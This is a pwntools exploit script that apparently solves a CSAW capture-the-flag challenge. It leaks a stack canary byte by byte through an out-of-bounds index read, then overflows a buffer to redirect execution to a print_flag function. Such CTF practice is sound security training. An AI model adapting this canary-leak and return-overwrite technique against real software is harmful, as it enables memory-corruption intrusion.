from pwn import *

def leak_byte(index):
    p = remote('pwn.chal.csaw.io', 7900)
    p.recvuntil(b'> ')
    p.sendline(b'V')
    p.recvuntil(b'Index : ')
    p.sendline(str(index).encode())
    p.recvuntil(f'Index {index} : '.encode())
    value = p.recv(2)  # Read two hex characters
    p.close()
    return int(value, 16)

# Leak the canary byte by byte (indices 64-67)
canary = 0
for i in range(4):
    byte = leak_byte(64 + i)
    canary |= (byte << (i * 8))

print(f"Leaked canary: 0x{canary:08x}")

# Now create the final exploit
p = remote('pwn.chal.csaw.io', 7900)
p.recvuntil(b'> ')
p.sendline(b'E')
p.recvuntil(b'Size : ')
p.sendline(b'76')

# Create the payload
# 72 bytes of padding (A's)
# 4 bytes for the leaked canary (little-endian)
# 4 bytes for the return address (print_flag: 0x08049304 in little-endian)
payload = b'A' * 72 + p32(canary) + p32(0x08049304)

p.send(payload)
print(p.recvall().decode('ascii'))
